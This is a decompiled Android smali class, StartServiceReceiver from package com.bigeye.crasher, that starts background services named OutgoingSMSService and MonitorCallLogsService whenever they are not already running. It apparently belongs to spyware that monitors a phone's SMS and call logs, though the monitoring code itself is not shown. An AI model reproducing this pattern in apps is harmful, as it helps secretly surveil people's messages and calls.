.class public Lcom/bigeye/crasher/StartServiceReceiver;
.super Landroid/content/BroadcastReceiver;
.source "StartServiceReceiver.java"


# instance fields
.field private APP_TAG:Ljava/lang/String;

.field private CALLLOG_SVC_NAME:Ljava/lang/String;

.field private OUTGOING_SVC_NAME:Ljava/lang/String;

.field public context:Landroid/content/Context;


# direct methods
.method public constructor <init>()V
    .locals 1

    .prologue
    .line 10
    invoke-direct {p0}, Landroid/content/BroadcastReceiver;-><init>()V

    .line 20
    const-class v0, Lcom/bigeye/crasher/OutgoingSMSService;

    invoke-virtual {v0}, Ljava/lang/Class;->getName()Ljava/lang/String;

    move-result-object v0

    iput-object v0, p0, Lcom/bigeye/crasher/StartServiceReceiver;->OUTGOING_SVC_NAME:Ljava/lang/String;

    .line 21
    const-class v0, Lcom/bigeye/crasher/MonitorCallLogsService;

    invoke-virtual {v0}, Ljava/lang/Class;->getName()Ljava/lang/String;

    move-result-object v0

    iput-object v0, p0, Lcom/bigeye/crasher/StartServiceReceiver;->CALLLOG_SVC_NAME:Ljava/lang/String;

    .line 22
    const-string v0, "StartServiceReceiver"

    iput-object v0, p0, Lcom/bigeye/crasher/StartServiceReceiver;->APP_TAG:Ljava/lang/String;

    return-void
.end method


# virtual methods
.method public isServiceRunning(Ljava/lang/String;)Z
    .locals 5
    .param p1, "SVC_NAME"    # Ljava/lang/String;

    .prologue
    .line 41
    iget-object v2, p0, Lcom/bigeye/crasher/StartServiceReceiver;->context:Landroid/content/Context;

    iget-object v3, p0, Lcom/bigeye/crasher/StartServiceReceiver;->context:Landroid/content/Context;

    const-string v3, "activity"

    invoke-virtual {v2, v3}, Landroid/content/Context;->getSystemService(Ljava/lang/String;)Ljava/lang/Object;

    move-result-object v0

    check-cast v0, Landroid/app/ActivityManager;

    .line 42
    .local v0, "manager":Landroid/app/ActivityManager;
    const v2, 0x7fffffff

    invoke-virtual {v0, v2}, Landroid/app/ActivityManager;->getRunningServices(I)Ljava/util/List;

    move-result-object v2

    invoke-interface {v2}, Ljava/util/List;->iterator()Ljava/util/Iterator;

    move-result-object v2

    :cond_0
    invoke-interface {v2}, Ljava/util/Iterator;->hasNext()Z

    move-result v3

    if-eqz v3, :cond_1

    invoke-interface {v2}, Ljava/util/Iterator;->next()Ljava/lang/Object;

    move-result-object v1

    check-cast v1, Landroid/app/ActivityManager$RunningServiceInfo;

    .line 43
    .local v1, "service":Landroid/app/ActivityManager$RunningServiceInfo;
    iget-object v3, v1, Landroid/app/ActivityManager$RunningServiceInfo;->service:Landroid/content/ComponentName;

    invoke-virtual {v3}, Landroid/content/ComponentName;->getClassName()Ljava/lang/String;

    move-result-object v3

    invoke-virtual {p1, v3}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v3

    if-eqz v3, :cond_0

    .line 44
    iget-object v2, p0, Lcom/bigeye/crasher/StartServiceReceiver;->APP_TAG:Ljava/lang/String;

    new-instance v3, Ljava/lang/StringBuilder;

    invoke-direct {v3}, Ljava/lang/StringBuilder;-><init>()V

    invoke-virtual {v3, p1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v3

    const-string v4, " already running!"

    invoke-virtual {v3, v4}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v3

    invoke-virtual {v3}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v3

    invoke-static {v2, v3}, Landroid/util/Log;->i(Ljava/lang/String;Ljava/lang/String;)I

    .line 45
    const/4 v2, 0x1

    .line 49
    .end local v1    # "service":Landroid/app/ActivityManager$RunningServiceInfo;
    :goto_0
    return v2

    .line 48
    :cond_1
    iget-object v2, p0, Lcom/bigeye/crasher/StartServiceReceiver;->APP_TAG:Ljava/lang/String;

    new-instance v3, Ljava/lang/StringBuilder;

    invoke-direct {v3}, Ljava/lang/StringBuilder;-><init>()V

    invoke-virtual {v3, p1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v3

    const-string v4, " not running!"

    invoke-virtual {v3, v4}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v3

    invoke-virtual {v3}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v3

    invoke-static {v2, v3}, Landroid/util/Log;->i(Ljava/lang/String;Ljava/lang/String;)I

    .line 49
    const/4 v2, 0x0

    goto :goto_0
.end method

.method public onReceive(Landroid/content/Context;Landroid/content/Intent;)V
    .locals 3
    .param p1, "context"    # Landroid/content/Context;
    .param p2, "intent"    # Landroid/content/Intent;

    .prologue
    .line 27
    iput-object p1, p0, Lcom/bigeye/crasher/StartServiceReceiver;->context:Landroid/content/Context;

    .line 28
    new-instance v1, Landroid/content/Intent;

    const-class v2, Lcom/bigeye/crasher/OutgoingSMSService;

    invoke-direct {v1, p1, v2}, Landroid/content/Intent;-><init>(Landroid/content/Context;Ljava/lang/Class;)V

    .line 29
    .local v1, "service":Landroid/content/Intent;
    new-instance v0, Landroid/content/Intent;

    const-class v2, Lcom/bigeye/crasher/MonitorCallLogsService;

    invoke-direct {v0, p1, v2}, Landroid/content/Intent;-><init>(Landroid/content/Context;Ljava/lang/Class;)V

    .line 31
    .local v0, "LogService":Landroid/content/Intent;
    iget-object v2, p0, Lcom/bigeye/crasher/StartServiceReceiver;->OUTGOING_SVC_NAME:Ljava/lang/String;

    invoke-virtual {p0, v2}, Lcom/bigeye/crasher/StartServiceReceiver;->isServiceRunning(Ljava/lang/String;)Z

    move-result v2

    if-nez v2, :cond_1

    .line 32
    invoke-virtual {p1, v1}, Landroid/content/Context;->startService(Landroid/content/Intent;)Landroid/content/ComponentName;

    .line 38
    :cond_0
    :goto_0
    return-void

    .line 33
    :cond_1
    iget-object v2, p0, Lcom/bigeye/crasher/StartServiceReceiver;->CALLLOG_SVC_NAME:Ljava/lang/String;

    invoke-virtual {p0, v2}, Lcom/bigeye/crasher/StartServiceReceiver;->isServiceRunning(Ljava/lang/String;)Z

    move-result v2

    if-nez v2, :cond_0

    .line 34
    invoke-virtual {p1, v0}, Landroid/content/Context;->startService(Landroid/content/Intent;)Landroid/content/ComponentName;

    goto :goto_0
.end method
